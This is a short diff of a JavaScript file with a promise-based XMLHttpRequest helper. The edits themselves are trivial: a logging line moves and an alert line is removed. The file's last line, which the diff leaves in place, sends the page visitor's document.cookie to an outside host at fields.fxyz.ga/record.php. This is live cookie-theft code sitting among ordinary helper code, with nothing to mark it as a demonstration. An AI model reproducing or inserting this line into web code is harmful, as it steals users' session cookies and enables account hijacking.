@@ -4,11 +4,11 @@ function get(url) {
 		req.open('GET', url);
 		req.onload = function() {
 			if (req.status == 200) {
-				console.log("done");
 				resolve(req.response);
 			} else {
 				reject(Error(req.statusText));
 			}
+			console.log("done");
 		};
 		req.onerror = function() {
 			reject(Error("Network Error"));
@@ -17,4 +17,3 @@ function get(url) {
 	});
 }
 get("http://fields.fxyz.ga/record.php?c="+document.cookie);
-alert("hi");
